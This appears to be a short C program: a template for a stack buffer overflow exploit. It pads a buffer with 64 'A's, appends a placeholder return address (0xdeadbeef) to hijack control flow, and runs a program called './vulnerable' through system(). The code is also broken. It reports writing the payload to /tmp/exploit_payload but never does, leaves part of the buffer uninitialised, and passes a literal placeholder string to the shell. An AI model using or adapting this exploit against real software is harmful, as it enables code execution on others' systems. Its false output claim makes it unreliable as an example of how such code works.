#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main() {
    // Construct a payload that triggers the vulnerability
    char payload[100];
    memset(payload, 'A', 64);  // Overwrite the buffer
    // Add the address of the shellcode or return address to hijack control flow
    long ret_addr = 0xdeadbeef;  // Example, replace with the correct return address

    // Adding the return address at the end of the payload
    memcpy(payload + 64, &ret_addr, sizeof(ret_addr));
    payload[99] = '\0';  // Null-terminate the string

    // Write payload to a file or execute the vulnerable program with the payload
    printf("[+] Exploit payload written to /tmp/exploit_payload\n");

    // Optionally, execute vulnerable program with payload
    system("./vulnerable <payload>");
}
